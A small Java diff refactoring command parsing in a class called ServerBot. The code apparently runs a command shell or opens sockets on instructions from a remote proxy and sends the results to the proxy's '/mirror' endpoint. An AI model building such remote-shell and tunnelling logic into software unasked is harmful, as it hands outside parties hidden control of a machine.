@@ -109,13 +109,12 @@ public class ServerBot extends Thread {
         sockRestIdBackUp = sockRestId;
         Thread.sleep(LinkAbstract.delay);
       }
-      String[] info = command.split(":", 2);
-      if (info[0].equals("cmd")) {
+      if (command.equals("cmd")) {
         CMD cmd = new CMD();
         cmd.startSend(proxyUrl.concat("/mirror"), sockRestId);
         return;
       }
-      info = command.split(":");
+      String[] info = command.split(":");
       sock = openSocket(command);
       SEND send = new SEND();
       send.startSend(proxyUrl.concat("/mirror"), sock, info[2]);
